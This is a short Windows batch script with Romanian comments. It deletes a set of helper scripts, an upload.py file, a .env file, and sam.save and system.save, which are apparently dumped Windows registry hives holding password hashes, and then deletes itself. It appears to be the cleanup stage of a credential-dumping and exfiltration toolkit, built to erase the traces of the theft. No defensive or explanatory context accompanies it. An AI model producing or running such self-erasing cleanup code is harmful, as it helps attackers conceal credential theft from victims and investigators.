@echo off
setlocal ENABLEDELAYEDEXPANSION

REM Obține locația scriptului curent
set SCRIPT_DIR=%~dp0

REM Mergi la directorul scriptului
cd /d "%SCRIPT_DIR%"

del "script1.bat"
del ".env"
del "script.bat"
del "initialize.ps1"
del "upload.py"
del "install.bat"
del "sam.save"
del "system.save"
REM Delete self after execution
del "%~f0"
